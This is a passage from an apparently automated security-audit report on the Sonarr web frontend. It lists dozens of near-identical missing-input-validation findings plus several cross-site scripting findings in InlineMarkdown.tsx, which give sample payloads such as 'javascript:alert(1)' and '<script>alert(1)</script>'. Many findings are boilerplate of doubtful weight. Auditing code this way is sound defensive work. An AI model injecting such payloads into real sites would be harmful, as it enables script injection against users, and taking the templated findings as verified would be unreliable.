Function accepts input parameter but doesn't validate its type or existence before processing
```

**Impact:**
Invalid input could cause runtime errors or incorrect splitting in the UI.

**Proof of Concept:**
Calling split(null) could cause issues in the processing logic.

**How to Test:**
1. Call split with various invalid inputs (null, undefined, non-string values)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Utilities_String_splitts.py`
---

### 99. Improper Input Validation (CWE-20)

**File:** frontend/src/Utilities/String/titleCase.ts
**Line:** 8

**Description:**
The titleCase function doesn't validate the input parameter, which could lead to errors when invalid values are passed.

**Evidence:**
```
Function accepts input parameter but doesn't validate its type or existence before processing
```

**Impact:**
Invalid input could cause runtime errors or incorrect title case conversion in the UI.

**Proof of Concept:**
Calling titleCase(null) could cause issues in the processing logic.

**How to Test:**
1. Call titleCase with various invalid inputs (null, undefined, non-string values)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Utilities_String_titleCasets.py`
---

### 100. Improper Input Validation (CWE-20)

**File:** frontend/src/Utilities/String/naturalExpansion.ts
**Line:** 8

**Description:**
The naturalExpansion function doesn't validate the input parameter, which could lead to errors when invalid values are passed.

**Evidence:**
```
Function accepts input parameter but doesn't validate its type or existence before processing
```

**Impact:**
Invalid input could cause runtime errors or incorrect natural expansion in the UI.

**Proof of Concept:**
Calling naturalExpansion(null) could cause issues in the processing logic.

**How to Test:**
1. Call naturalExpansion with various invalid inputs (null, undefined, non-string values)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Utilities_String_naturalExpansionts.py`
---

### 101. Improper Input Validation (CWE-20)

**File:** frontend/src/Utilities/String/combinePath.ts
**Line:** 10

**Description:**
The combinePath function doesn't validate the input parameters, which could lead to errors when invalid values are passed.

**Evidence:**
```
Function accepts multiple parameters but doesn't validate their types or existence before processing
```

**Impact:**
Invalid input could cause runtime errors or incorrect path combination in the UI.

**Proof of Concept:**
Calling combinePath(null, 'base', ['path']) could cause issues in the processing logic.

**How to Test:**
1. Call combinePath with various invalid inputs (null, undefined, non-string values)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Utilities_String_combinePathts.py`
---

### 102. Improper Input Validation (CWE-20)

**File:** frontend/src/Utilities/String/parseUrl.ts
**Line:** 15

**Description:**
The parseUrl function doesn't validate the input parameter, which could lead to errors when invalid values are passed.

**Evidence:**
```
Function accepts url parameter but doesn't validate its type or existence before processing
```

**Impact:**
Invalid input could cause runtime errors or incorrect URL parsing in the UI.

**Proof of Concept:**
Calling parseUrl(null) could cause issues in the processing logic.

**How to Test:**
1. Call parseUrl with various invalid inputs (null, undefined, non-string values)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Utilities_String_parseUrlts.py`
---

### 103. Improper Input Validation (CWE-20)

**File:** frontend/src/Utilities/Filter/clientSideFilterAndSort.ts
**Line:** 100

**Description:**
The clientSideFilterAndSort function doesn't validate the input parameters, which could lead to errors when invalid values are passed.

**Evidence:**
```
Function accepts multiple parameters but doesn't validate their types or existence before processing
```

**Impact:**
Invalid input could cause runtime errors or incorrect filtering/sorting in the UI.

**Proof of Concept:**
Calling clientSideFilterAndSort(null, options) could cause issues in the processing logic.

**How to Test:**
1. Call clientSideFilterAndSort with various invalid inputs (null, undefined, non-array values)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Utilities_Filter_clientSideFilterAndSortts.py`
---

### 104. Improper Input Validation (CWE-20)

**File:** frontend/src/Utilities/Filter/findSelectedFilters.ts
**Line:** 10

**Description:**
The findSelectedFilters function doesn't validate the input parameters, which could lead to errors when invalid values are passed.

**Evidence:**
```
Function accepts multiple parameters but doesn't validate their types or existence before processing
```

**Impact:**
Invalid input could cause runtime errors or incorrect filter selection in the UI.

**Proof of Concept:**
Calling findSelectedFilters(null, filters, customFilters) could cause issues in the processing logic.

**How to Test:**
1. Call findSelectedFilters with various invalid inputs (null, undefined)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Utilities_Filter_findSelectedFiltersts.py`
---

### 105. Improper Input Validation (CWE-20)

**File:** frontend/src/Utilities/Filter/getFilterValue.ts
**Line:** 15

**Description:**
The getFilterValue function doesn't validate the input parameters, which could lead to errors when invalid values are passed.

**Evidence:**
```
Function accepts multiple parameters but doesn't validate their types or existence before processing
```

**Impact:**
Invalid input could cause runtime errors or incorrect filter value retrieval in the UI.

**Proof of Concept:**
Calling getFilterValue(null, filterKey, filterValueKey, defaultValue) could cause issues in the processing logic.

**How to Test:**
1. Call getFilterValue with various invalid inputs (null, undefined)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Utilities_Filter_getFilterValuets.py`
---

### 106. Improper Input Validation (CWE-20)

**File:** frontend/src/Utilities/State/getProviderState.js
**Line:** 15

**Description:**
The getProviderState function doesn't validate the input parameters, which could lead to errors when invalid values are passed.

**Evidence:**
```
Function accepts payload parameter but doesn't validate its type or existence before processing
```

**Impact:**
Invalid input could cause runtime errors or incorrect state management in the UI.

**Proof of Concept:**
Calling getProviderState(null, getState, section) could cause issues in the processing logic.

**How to Test:**
1. Call getProviderState with various invalid inputs (null, undefined)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Utilities_State_getProviderStatejs.py`
---

### 107. Improper Input Validation (CWE-20)

**File:** frontend/src/Utilities/State/getSectionState.js
**Line:** 10

**Description:**
The getSectionState function doesn't validate the input parameters, which could lead to errors when invalid values are passed.

**Evidence:**
```
Function accepts state and section parameters but doesn't validate their types or existence before processing
```

**Impact:**
Invalid input could cause runtime errors or incorrect state retrieval in the UI.

**Proof of Concept:**
Calling getSectionState(null, section) could cause issues in the processing logic.

**How to Test:**
1. Call getSectionState with various invalid inputs (null, undefined)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Utilities_State_getSectionStatejs.py`
---

### 108. Improper Input Validation (CWE-20)

**File:** frontend/src/Utilities/State/selectProviderSchema.js
**Line:** 20

**Description:**
The selectProviderSchema function doesn't validate the input parameters, which could lead to errors when invalid values are passed.

**Evidence:**
```
Function accepts state, section, and payload parameters but doesn't validate their types or existence before processing
```

**Impact:**
Invalid input could cause runtime errors or incorrect schema selection in the UI.

**Proof of Concept:**
Calling selectProviderSchema(null, section, payload) could cause issues in the processing logic.

**How to Test:**
1. Call selectProviderSchema with various invalid inputs (null, undefined)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Utilities_State_selectProviderSchemajs.py`
---

### 109. Improper Input Validation (CWE-20)

**File:** frontend/src/Utilities/Command/isCommandComplete.ts
**Line:** 8

**Description:**
The isCommandComplete function doesn't validate the input parameter, which could lead to errors when invalid values are passed.

**Evidence:**
```
Function accepts command parameter but doesn't validate its type or existence before processing
```

**Impact:**
Invalid input could cause runtime errors or incorrect command status checking in the UI.

**Proof of Concept:**
Calling isCommandComplete(null) could cause issues in the processing logic.

**How to Test:**
1. Call isCommandComplete with various invalid inputs (null, undefined)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Utilities_Command_isCommandCompletets.py`
---

### 110. Improper Input Validation (CWE-20)

**File:** frontend/src/Utilities/Command/isCommandExecuting.ts
**Line:** 8

**Description:**
The isCommandExecuting function doesn't validate the input parameter, which could lead to errors when invalid values are passed.

**Evidence:**
```
Function accepts command parameter but doesn't validate its type or existence before processing
```

**Impact:**
Invalid input could cause runtime errors or incorrect command execution checking in the UI.

**Proof of Concept:**
Calling isCommandExecuting(null) could cause issues in the processing logic.

**How to Test:**
1. Call isCommandExecuting with various invalid inputs (null, undefined)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Utilities_Command_isCommandExecutingts.py`
---

### 111. Improper Input Validation (CWE-20)

**File:** frontend/src/Utilities/Command/isCommandFailed.ts
**Line:** 8

**Description:**
The isCommandFailed function doesn't validate the input parameter, which could lead to errors when invalid values are passed.

**Evidence:**
```
Function accepts command parameter but doesn't validate its type or existence before processing
```

**Impact:**
Invalid input could cause runtime errors or incorrect command failure checking in the UI.

**Proof of Concept:**
Calling isCommandFailed(null) could cause issues in the processing logic.

**How to Test:**
1. Call isCommandFailed with various invalid inputs (null, undefined)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Utilities_Command_isCommandFailedts.py`
---

### 112. Improper Input Validation (CWE-20)

**File:** frontend/src/Utilities/Command/isSameCommand.ts
**Line:** 15

**Description:**
The isSameCommand function doesn't validate the input parameters, which could lead to errors when invalid values are passed.

**Evidence:**
```
Function accepts multiple parameters but doesn't validate their types or existence before processing
```

**Impact:**
Invalid input could cause runtime errors or incorrect command comparison in the UI.

**Proof of Concept:**
Calling isSameCommand(null, commandB) could cause issues in the processing logic.

**How to Test:**
1. Call isSameCommand with various invalid inputs (null, undefined)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Utilities_Command_isSameCommandts.py`
---

### 113. Improper Input Validation (CWE-20)

**File:** frontend/src/Utilities/Command/findCommand.ts
**Line:** 10

**Description:**
The findCommand function doesn't validate the input parameters, which could lead to errors when invalid values are passed.

**Evidence:**
```
Function accepts commands and options parameters but doesn't validate their types or existence before processing
```

**Impact:**
Invalid input could cause runtime errors or incorrect command finding in the UI.

**Proof of Concept:**
Calling findCommand(null, options) could cause issues in the processing logic.

**How to Test:**
1. Call findCommand with various invalid inputs (null, undefined)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Utilities_Command_findCommandts.py`
---

### 114. Improper Input Validation (CWE-20)

**File:** frontend/src/Utilities/Array/getIndexOfFirstCharacter.ts
**Line:** 10

**Description:**
The getIndexOfFirstCharacter function doesn't validate the input parameters, which could lead to errors when invalid values are passed.

**Evidence:**
```
Function accepts multiple parameters but doesn't validate their types or existence before processing
```

**Impact:**
Invalid input could cause runtime errors or incorrect character index finding in the UI.

**Proof of Concept:**
Calling getIndexOfFirstCharacter(null, character) could cause issues in the processing logic.

**How to Test:**
1. Call getIndexOfFirstCharacter with various invalid inputs (null, undefined)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Utilities_Array_getIndexOfFirstCharacterts.py`
---

### 115. Improper Input Validation (CWE-20)

**File:** frontend/src/Utilities/Array/sortByProp.ts
**Line:** 10

**Description:**
The sortByProp function doesn't validate the input parameters, which could lead to errors when invalid values are passed.

**Evidence:**
```
Function accepts sortKey parameter but doesn't validate its type or existence before processing
```

**Impact:**
Invalid input could cause runtime errors or incorrect sorting in the UI.

**Proof of Concept:**
Calling sortByProp(null) could cause issues in the processing logic.

**How to Test:**
1. Call sortByProp with various invalid inputs (null, undefined)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Utilities_Array_sortByPropts.py`
---

### 116. Improper Input Validation (CWE-20)

**File:** frontend/src/Utilities/Table/toggleSelected.ts
**Line:** 20

**Description:**
The toggleSelected function doesn't validate the input parameters, which could lead to errors when invalid values are passed.

**Evidence:**
```
Function accepts multiple parameters but doesn't validate their types or existence before processing
```

**Impact:**
Invalid input could cause runtime errors or incorrect selection toggling in the UI.

**Proof of Concept:**
Calling toggleSelected(null, items, id, selected, shiftKey) could cause issues in the processing logic.

**How to Test:**
1. Call toggleSelected with various invalid inputs (null, undefined)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Utilities_Table_toggleSelectedts.py`
---

### 117. Improper Input Validation (CWE-20)

**File:** frontend/src/Utilities/Table/getToggledRange.ts
**Line:** 10

**Description:**
The getToggledRange function doesn't validate the input parameters, which could lead to errors when invalid values are passed.

**Evidence:**
```
Function accepts multiple parameters but doesn't validate their types or existence before processing
```

**Impact:**
Invalid input could cause runtime errors or incorrect range calculation in the UI.

**Proof of Concept:**
Calling getToggledRange(null, id, lastToggled) could cause issues in the processing logic.

**How to Test:**
1. Call getToggledRange with various invalid inputs (null, undefined)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Utilities_Table_getToggledRangets.py`
---

### 118. Improper Input Validation (CWE-20)

**File:** frontend/src/Utilities/Fetch/fetchJson.ts
**Line:** 50

**Description:**
The fetchJson function doesn't validate the input parameters, which could lead to errors when invalid values are passed.

**Evidence:**
```
Function accepts multiple parameters but doesn't validate their types or existence before processing
```

**Impact:**
Invalid input could cause runtime errors or incorrect API calls in the UI.

**Proof of Concept:**
Calling fetchJson(null) could cause issues in the processing logic.

**How to Test:**
1. Call fetchJson with various invalid inputs (null, undefined)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Utilities_Fetch_fetchJsonts.py`
---

### 119. Improper Input Validation (CWE-20)

**File:** frontend/src/Utilities/Fetch/useApiMutation.ts
**Line:** 10

**Description:**
The useApiMutation hook doesn't validate the input parameters, which could lead to errors when invalid values are passed.

**Evidence:**
```
Function accepts multiple parameters but doesn't validate their types or existence before processing
```

**Impact:**
Invalid input could cause runtime errors or incorrect API mutations in the UI.

**Proof of Concept:**
Calling useApiMutation(null) could cause issues in the processing logic.

**How to Test:**
1. Call useApiMutation with various invalid inputs (null, undefined)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Utilities_Fetch_useApiMutationts.py`
---

### 120. Improper Input Validation (CWE-20)

**File:** frontend/src/Utilities/Fetch/useApiQuery.ts
**Line:** 10

**Description:**
The useApiQuery hook doesn't validate the input parameters, which could lead to errors when invalid values are passed.

**Evidence:**
```
Function accepts multiple parameters but doesn't validate their types or existence before processing
```

**Impact:**
Invalid input could cause runtime errors or incorrect API queries in the UI.

**Proof of Concept:**
Calling useApiQuery(null) could cause issues in the processing logic.

**How to Test:**
1. Call useApiQuery with various invalid inputs (null, undefined)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Utilities_Fetch_useApiQueryts.py`
---

### 121. Improper Input Validation (CWE-20)

**File:** frontend/src/System/useSystem.ts
**Line:** 10

**Description:**
The useRestart hook doesn't validate the input parameters, which could lead to errors when invalid values are passed.

**Evidence:**
```
Function accepts multiple parameters but doesn't validate their types or existence before processing
```

**Impact:**
Invalid input could cause runtime errors or incorrect system restart operations in the UI.

**Proof of Concept:**
Calling useRestart(null) could cause issues in the processing logic.

**How to Test:**
1. Call useRestart with various invalid inputs (null, undefined)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_System_useSystemts.py`
---

### 122. Improper Input Validation (CWE-20)

**File:** frontend/src/System/useSystem.ts
**Line:** 25

**Description:**
The useShutdown hook doesn't validate the input parameters, which could lead to errors when invalid values are passed.

**Evidence:**
```
Function accepts multiple parameters but doesn't validate their types or existence before processing
```

**Impact:**
Invalid input could cause runtime errors or incorrect system shutdown operations in the UI.

**Proof of Concept:**
Calling useShutdown(null) could cause issues in the processing logic.

**How to Test:**
1. Call useShutdown with various invalid inputs (null, undefined)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_System_useSystemts.py`
---

### 123. Improper Input Validation (CWE-20)

**File:** frontend/src/System/Tasks/useTasks.ts
**Line:** 10

**Description:**
The useTasks hook doesn't validate the input parameters, which could lead to errors when invalid values are passed.

**Evidence:**
```
Function accepts multiple parameters but doesn't validate their types or existence before processing
```

**Impact:**
Invalid input could cause runtime errors or incorrect task retrieval in the UI.

**Proof of Concept:**
Calling useTasks(null) could cause issues in the processing logic.

**How to Test:**
1. Call useTasks with various invalid inputs (null, undefined)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_System_Tasks_useTasksts.py`
---

### 124. Improper Input Validation (CWE-20)

**File:** frontend/src/System/Status/useSystemStatus.ts
**Line:** 10

**Description:**
The useSystemStatus hook doesn't validate the input parameters, which could lead to errors when invalid values are passed.

**Evidence:**
```
Function accepts multiple parameters but doesn't validate their types or existence before processing
```

**Impact:**
Invalid input could cause runtime errors or incorrect system status retrieval in the UI.

**Proof of Concept:**
Calling useSystemStatus(null) could cause issues in the processing logic.

**How to Test:**
1. Call useSystemStatus with various invalid inputs (null, undefined)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_System_Status_useSystemStatusts.py`
---

### 125. Improper Input Validation (CWE-20)

**File:** frontend/src/System/Status/Health/useHealth.ts
**Line:** 10

**Description:**
The useHealth hook doesn't validate the input parameters, which could lead to errors when invalid values are passed.

**Evidence:**
```
Function accepts multiple parameters but doesn't validate their types or existence before processing
```

**Impact:**
Invalid input could cause runtime errors or incorrect health status retrieval in the UI.

**Proof of Concept:**
Calling useHealth(null) could cause issues in the processing logic.

**How to Test:**
1. Call useHealth with various invalid inputs (null, undefined)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_System_Status_Health_useHealthts.py`
---

### 126. Cross-site Scripting (CWE-79)

**File:** frontend/src/Components/Markdown/InlineMarkdown.tsx
**Line:** 35

**Description:**
The InlineMarkdown component processes markdown links but doesn't properly sanitize the URL values, potentially allowing XSS attacks through malicious URLs.

**Evidence:**
```
The component extracts URLs from markdown links using regex but directly uses the extracted URL without sanitization in the Link component.
```

**Impact:**
An attacker could inject malicious JavaScript code through URL parameters that would execute when users click on links in markdown content.

**Proof of Concept:**
If a markdown string contains '[link](javascript:alert(1))', the URL 'javascript:alert(1)' would be directly used in the Link component's 'to' prop, causing XSS when clicked.

**How to Test:**
1. Create a markdown string with malicious URLs like 'javascript:alert(1)' or 'data:text/html,<script>alert(1)</script>'
2. Pass this to InlineMarkdown component
3. Verify that the resulting links execute the injected JavaScript

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_Components_Markdown_InlineMarkdowntsx.py`
---

### 127. Cross-site Scripting (CWE-79)

**File:** frontend/src/Components/Markdown/InlineMarkdown.tsx
**Line:** 47

**Description:**
The InlineMarkdown component processes code blocks but doesn't properly sanitize the content, potentially allowing XSS attacks through code content.

**Evidence:**
```
The component extracts code content but directly renders it in a code element without sanitization.
```

**Impact:**
An attacker could inject malicious JavaScript code through code blocks that would execute when users view the markdown content.

**Proof of Concept:**
If a markdown string contains '`<script>alert(1)</script>`', the script content would be directly rendered in a code element, potentially executing when the page loads.

**How to Test:**
1. Create a markdown string with code blocks containing malicious scripts
2. Pass this to InlineMarkdown component
3. Verify that the resulting code blocks execute injected JavaScript

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_Components_Markdown_InlineMarkdowntsx.py`
---

### 128. Improper Input Validation (CWE-20)

**File:** frontend/src/Components/Form/Select/EnhancedSelectInput.tsx
**Line:** 240

**Description:**
The EnhancedSelectInput component doesn't validate the 'value' prop before using it, potentially causing issues when invalid values are passed.

**Evidence:**
```
The component uses getSelectedIndex(value, values) without validating that 'value' is a valid value from the 'values' array.
```

**Impact:**
Invalid values could cause unexpected behavior or errors in the select component, potentially leading to UI inconsistencies.

**Proof of Concept:**
If a select input receives a value that doesn't exist in the values array, getSelectedIndex will return -1, causing incorrect selection handling.

**How to Test:**
1. Pass an invalid value to EnhancedSelectInput component
2. Observe if the component handles the invalid value gracefully
3. Check for potential errors or incorrect UI behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Components_Form_Select_EnhancedSelectInputtsx.py`
---

### 129. Improper Input Validation (CWE-20)

**File:** frontend/src/Components/Form/Select/EnhancedSelectInput.tsx
**Line:** 248

**Description:**
The EnhancedSelectInput component doesn't validate the 'value' prop against the 'values' array, potentially causing index out of bounds errors.

**Evidence:**
```
The component directly uses selectedIndex without checking if it's within valid bounds of the values array.
```

**Impact:**
Invalid indices could cause runtime errors or incorrect selection behavior in the select component.

**Proof of Concept:**
If selectedIndex becomes greater than or equal to values.length, accessing values[selectedIndex] would return undefined, causing potential errors.

**How to Test:**
1. Test EnhancedSelectInput with edge cases where selectedIndex might exceed array bounds
2. Verify error handling for invalid indices
3. Check for potential runtime exceptions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Components_Form_Select_EnhancedSelectInputtsx.py`
---

### 130. Improper Input Validation (CWE-20)

**File:** frontend/src/Components/Form/Select/RootFolderSelectInput.tsx
**Line:** 100

**Description:**
The RootFolderSelectInput component doesn't validate the 'value' prop against the available root folders, potentially causing issues with missing values.

**Evidence:**
```
The component adds missing values to the options array but doesn't validate that the provided 'value' is valid.
```

**Impact:**
Invalid root folder values could cause incorrect UI state or data handling in the application.

**Proof of Concept:**
If a root folder value is passed that doesn't exist in the data array, the component might not handle it correctly in the UI.

**How to Test:**
1. Pass an invalid root folder value to RootFolderSelectInput
2. Verify the component handles missing values gracefully
3. Check for UI inconsistencies or data handling issues

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Components_Form_Select_RootFolderSelectInputtsx.py`
---

### 131. Improper Input Validation (CWE-20)

**File:** frontend/src/Components/Form/Tag/TagInput.tsx
**Line:** 100

**Description:**
The TagInput component doesn't validate the 'value' prop against the available tags, potentially causing issues with tag selection.

**Evidence:**
```
The component processes tags but doesn't validate that the provided values are valid from the tag list.
```

**Impact:**
Invalid tag values could cause incorrect UI state or data handling in the tag input component.

**Proof of Concept:**
If a tag value is passed that doesn't exist in the tag list, the component might not handle it correctly in the UI.

**How to Test:**
1. Pass invalid tag values to TagInput component
2. Verify the component handles invalid values gracefully
3. Check for UI inconsistencies or data handling issues

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Components_Form_Tag_TagInputtsx.py`
---

### 132. Improper Input Validation (CWE-20)

**File:** frontend/src/Components/Form/Tag/SeriesTagInput.tsx
**Line:** 60

**Description:**
The SeriesTagInput component doesn't validate the 'value' prop against the available tags, potentially causing issues with tag selection.

**Evidence:**
```
The component processes tag values but doesn't validate that the provided values are valid from the tag list.
```

**Impact:**
Invalid tag values could cause incorrect UI state or data handling in the series tag input component.

**Proof of Concept:**
If a tag value is passed that doesn't exist in the tag list, the component might not handle it correctly in the UI.

**How to Test:**
1. Pass invalid tag values to SeriesTagInput component
2. Verify the component handles invalid values gracefully
3. Check for UI inconsistencies or data handling issues

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Components_Form_Tag_SeriesTagInputtsx.py`
---

### 133. Improper Input Validation (CWE-20)

**File:** frontend/src/Components/Form/Tag/TextTagInput.tsx
**Line:** 40

**Description:**
The TextTagInput component doesn't validate the 'value' prop against the available tags, potentially causing issues with tag selection.

**Evidence:**
```
The component processes tag values but doesn't validate that the provided values are valid from the tag list.
```

**Impact:**
Invalid tag values could cause incorrect UI state or data handling in the text tag input component.

**Proof of Concept:**
If a tag value is passed that doesn't exist in the tag list, the component might not handle it correctly in the UI.

**How to Test:**
1. Pass invalid tag values to TextTagInput component
2. Verify the component handles invalid values gracefully
3. Check for UI inconsistencies or data handling issues

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Components_Form_Tag_TextTagInputtsx.py`
---

### 134. Improper Input Validation (CWE-20)

**File:** frontend/src/Components/Form/Tag/DeviceInput.tsx
**Line:** 50

**Description:**
The DeviceInput component doesn't validate the 'value' prop against the available devices, potentially causing issues with device selection.

**Evidence:**
```
The component processes device values but doesn't validate that the provided values are valid from the device list.
```

**Impact:**
Invalid device values could cause incorrect UI state or data handling in the device input component.

**Proof of Concept:**
If a device value is passed that doesn't exist in the device list, the component might not handle it correctly in the UI.

**How to Test:**
1. Pass invalid device values to DeviceInput component
2. Verify the component handles invalid values gracefully
3. Check for UI inconsistencies or data handling issues

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Components_Form_Tag_DeviceInputtsx.py`
---

### 135. Improper Input Validation (CWE-20)

**File:** frontend/src/Components/Form/Tag/TagSelectInput.tsx
**Line:** 40

**Description:**
The TagSelectInput component doesn't validate the 'value' prop against the available tags, potentially causing issues with tag selection.

**Evidence:**
```
The component processes tag values but doesn't validate that the provided values are valid from the tag list.
```

**Impact:**
Invalid tag values could cause incorrect UI state or data handling in the tag select input component.

**Proof of Concept:**
If a tag value is passed that doesn't exist in the tag list, the component might not handle it correctly in the UI.

**How to Test:**
1. Pass invalid tag values to TagSelectInput component
2. Verify the component handles invalid values gracefully
3. Check for UI inconsistencies or data handling issues

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Components_Form_Tag_TagSelectInputtsx.py`
---

### 136. Cross-site Scripting (CWE-79)

**File:** frontend/src/Components/Markdown/InlineMarkdown.tsx
**Line:** 57

**Description:**
The InlineMarkdown component doesn't sanitize the code content, potentially allowing XSS through code content.

**Evidence:**
```
The component extracts code content but doesn't sanitize it before rendering, allowing HTML injection.
```

**Impact:**
An attacker could inject malicious HTML or JavaScript in code content that would execute when users view the markdown content.

**Proof of Concept:**
If a markdown string contains '`<script>alert(1)</script>`', the script content would be directly rendered in a code element, potentially executing when the page loads.

**How to Test:**
1. Create a markdown string with script tags in code blocks
2. Pass this to InlineMarkdown component
3. Verify that the script tags execute when the page loads

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_Components_Markdown_InlineMarkdowntsx.py`
---

### 137. Improper Input Validation (CWE-20)

**File:** frontend/src/Components/Markdown/InlineMarkdown.tsx
**Line:** 25

**Description:**
The InlineMarkdown component doesn't validate the input data, potentially causing issues with malformed markdown.

**Evidence:**
```
The component directly processes data without validating its structure or content before parsing.
```

**Impact:**
Malformed markdown data could cause parsing errors or unexpected behavior in the component.

**Proof of Concept:**
If the data prop contains invalid markdown or unexpected data types, the component might fail to parse correctly.

**How to Test:**
1. Pass malformed markdown data to InlineMarkdown component
2. Verify error handling and graceful degradation
3. Check for potential runtime exceptions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Components_Markdown_InlineMarkdowntsx.py`
---

### 138. Improper Input Validation (CWE-20)

**File:** frontend/src/Components/Link/Link.tsx
**Line:** 50

**Description:**
The Link component doesn't validate the 'to' prop, potentially causing issues with malformed URLs.

**Evidence:**
```
The component processes URLs but doesn't validate their structure before using them.
```

**Impact:**
Malformed URLs could cause navigation issues or errors in the application.

**Proof of Concept:**
If a malformed URL is passed to the Link component, it might not navigate correctly or could cause errors.

**How to Test:**
1. Pass malformed URLs to Link component
2. Verify navigation behavior
3. Check for potential errors or incorrect navigation

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Components_Link_Linktsx.py`
---

### 139. Improper Input Validation (CWE-20)

**File:** frontend/src/Components/Link/Link.tsx
**Line:** 55

**Description:**
The Link component doesn't validate the 'to' prop for URL protocols, potentially causing issues with external URLs.

**Evidence:**
```
The component uses regex to detect URLs but doesn't validate protocol formats.
```

**Impact:**
Invalid protocol URLs could cause navigation issues or errors in the application.

**Proof of Concept:**
If a URL with an invalid protocol is passed to the Link component, it might not navigate correctly.

**How to Test:**
1. Pass URLs with invalid protocols to Link component
2. Verify navigation behavior
3. Check for potential errors or incorrect navigation

